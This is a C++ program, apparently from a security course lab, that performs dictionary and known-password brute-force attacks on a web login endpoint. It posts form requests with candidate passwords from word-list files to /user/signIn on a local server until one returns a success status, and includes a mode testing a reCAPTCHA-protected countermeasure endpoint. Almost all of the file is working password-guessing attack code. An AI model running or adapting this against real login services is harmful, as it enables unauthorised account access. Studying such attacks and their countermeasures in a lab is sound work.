
#include <iostream>
#include<fstream>
#include<sys/socket.h>
#include<arpa/inet.h>	//inet_addr
#include <unistd.h>
#include <cstring>
#include <bits/stdc++.h>
#include <boost/algorithm/string.hpp>

using namespace std;

struct HTTP_Packet{
public:
    string method;
    string targetURL;
    string version;
    string content_type;
    string content_length;
    string request_body;
    HTTP_Packet(string method,string targetURL,string version,string content_type,string content_length,string request_body){
        this->method=method;
        this->targetURL=targetURL;
        this->version=version;
        this->content_type=content_type;
        this->content_length=content_length;
        this->request_body=request_body;
    }
};
int main() {
    string fileName;
    string URL;
    string body;
    cout<<"Enter the choice: "<<endl;
    cout<<"1. Dictionary Attack\n2. Known Password Attack\n3. CounterMeasure"<<endl;
    int choice;
    cin>>choice;
    if(choice==1){
        fileName="dictionary.txt";
        URL="/user/signIn";
        body="name=avijit&password=";
    }else if(choice==2){
        fileName="known_password.txt";
        URL="/user/signIn";
        body="name=navid&password=";
    }else if(choice==3){
        //fileName="dictionary.txt";
        URL="/user/signInRecaptcha";
        body="name=avijit&password=";
    }else{
        exit(0);
    }
    bool flagSuccess=false;
    int socket_descriptor;
    struct sockaddr_in server{}; //the server to which I want to connect to!
    string message;
    char received_message[2000];

    //create a tcp socket
    socket_descriptor = socket(AF_INET, SOCK_STREAM, 0);

    //configure server
    server.sin_family = AF_INET;
    server.sin_port = htons(3001);
    //server.sin_addr.s_addr = inet_addr("142.250.182.110");
    server.sin_addr.s_addr = inet_addr("127.0.0.1");

    //connect to the remote server
    if(connect(socket_descriptor,  (struct sockaddr *)&server, sizeof(server)) < 0 ){
        cout<<"Connection error!"<<endl;
    }
    cout<<"TCP Connection Established!"<<endl;

    //now we send some data to the internet
    //message = "GET / HTTP/1.1\r\n\r\n";
    vector<string> result;
    string password;
    ifstream input;
    if(choice==3){
        string pass = "aback";
        string text = body+pass;
        int length = text.length();
        string l = to_string(length);
        string method="POST";
        string targetURL=URL;
        string version="HTTP/1.1";
        string content_type="application/x-www-form-urlencoded";
        HTTP_Packet packet(method,targetURL,version,content_type,l,text);
        message=packet.method+" "+packet.targetURL+" "+packet.version+"\r\nContent-Type: "+packet.content_type+
        "\r\nContent-Length: "+packet.content_length+"\r\n\r\n"+packet.request_body;

      // message = "POST /user/signInRecaptcha HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: "+l+"\r\n\r\n"+text;
        if(send(socket_descriptor, message.c_str(), strlen(message.c_str()), 0) < 0){
            cout<<"Sending data failed!"<<endl;
        }
        cout<<"Data send!"<<endl;

        //now we receive some data from the server that we send the data
        if( recv(socket_descriptor, received_message , 2000 , 0) < 0)
        {
            cout<<"Received failed!"<<endl;
        }

        string s(received_message);
        string server_message = s;

        boost::split(result, server_message, boost::is_any_of("\n"));
        vector<string> firstLine;
        boost::split(firstLine, result[0], boost::is_any_of(" "));
        string statusCode=firstLine[1];
        if(statusCode=="201"){
            vector <string> mainMessage;
            boost::split(mainMessage, result[10], boost::is_any_of("}"));
            cout<<"The server message: "<<"\n"<<mainMessage[0]+"}"<<endl;
            cout<<pass+" is the correct password"<<endl;

        }
    else{
        cout<<pass+" is the password"<<endl;
        cout<<"The server message: "<<"\n"<<result[10]<<endl;
        cout<<"Attack is unsuccessful"<<endl;
        //closing socket
        close(socket_descriptor);
        cout<<"closing connection!"<<endl;
        exit(0);
    }
    }
    input.open(fileName);
    //input>>password;
    while(!input.eof()){
        input>>password;
        string pass = password;
        //string text = "name=avijit&password="+pass;
        string text=body+pass;
        int length = text.length();
        string l = to_string(length);
        string method="POST";
        string targetURL=URL;
        string version="HTTP/1.1";
        string content_type="application/x-www-form-urlencoded";
        HTTP_Packet packet(method,targetURL,version,content_type,l,text);
        message=packet.method+" "+packet.targetURL+" "+packet.version+"\r\nContent-Type: "+packet.content_type+
        "\r\nContent-Length: "+packet.content_length+"\r\n\r\n"+packet.request_body;
       // message = "POST /user/signIn HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: "+l+"\r\n\r\n"+text;

        if(send(socket_descriptor, message.c_str(), strlen(message.c_str()), 0) < 0){
            cout<<"Sending data failed!"<<endl;
        }
        cout<<"Data send!"<<endl;

        //now we receive some data from the server that we send the data
        if( recv(socket_descriptor, received_message , 2000 , 0) < 0)
        {
            cout<<"Received failed!"<<endl;
        }

        string s(received_message);
        string server_message = s;

        boost::split(result, server_message, boost::is_any_of("\n"));
        vector<string> firstLine;
        boost::split(firstLine, result[0], boost::is_any_of(" "));
        string statusCode=firstLine[1];
        if(statusCode=="201"){
            vector <string> mainMessage;
            boost::split(mainMessage, result[10], boost::is_any_of("}"));
            cout<<pass+" is the correct password"<<endl;
            cout<<"The server message: "<<"\n"<<mainMessage[0]+"}"<<endl;

            flagSuccess=true;
            break;

        }
        else{
             cout<<pass+" is not the correct password"<<endl;
             cout<<"The server message: "<<"\n"<<result[10]<<endl;
             cout<<endl;
        }

    }
    input.close();
    if(flagSuccess==false){
        cout<<"The server message: "<<"\n"<<result[10]<<endl;
        if(choice==1){
            cout<<"No Correct password is in the dictionary"<<endl;
        }else if(choice==2){
            cout<<"No Correct password is in the known_password list"<<endl;
        }

    }

    //closing socket
    close(socket_descriptor);
    cout<<"closing connection!"<<endl;

    return 0;
}
